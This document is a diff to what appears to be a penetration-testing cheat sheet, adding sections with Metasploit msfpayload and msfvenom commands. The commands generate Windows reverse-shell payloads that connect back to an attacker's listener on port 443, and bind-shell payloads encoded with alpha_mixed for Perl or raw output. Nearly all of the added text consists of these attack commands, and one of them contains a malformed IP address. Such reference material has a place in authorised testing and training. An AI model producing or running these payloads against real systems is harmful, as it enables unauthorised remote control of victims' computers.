@@ -76,3 +76,27 @@
   * XSS - https://www.veracode.com/security/xss
 
 
+## Reverse Shell
+### Windows XP/Vista Ultimate
+```bash
+/pentest/exploits/framework/msfpayload windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 C
+```
+### Later Windows
+```bash
+/pentest/exploits/framework/msfpayload windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 C 
+
+msfvenom -p windows/shell_reverse_tcp LHOST=1192.168.x.x LPORT=443 -a x86 --platform=win -e x86/alpha_mixed -f raw
+```
+
+## Bind Shell
+### Windows XP/Vista Ultimate
+```bash
+msfpayload windows/shell_bind_tcp R > bind
+msfencode -e x86/alpha_mixed -i bind -t perl
+```
+### Later Windows
+```bash
+msfvenom -p windows/shell_bind_tcp -a x86 --platform=win -e x86/alpha_mixed -f perl
+```
+
+
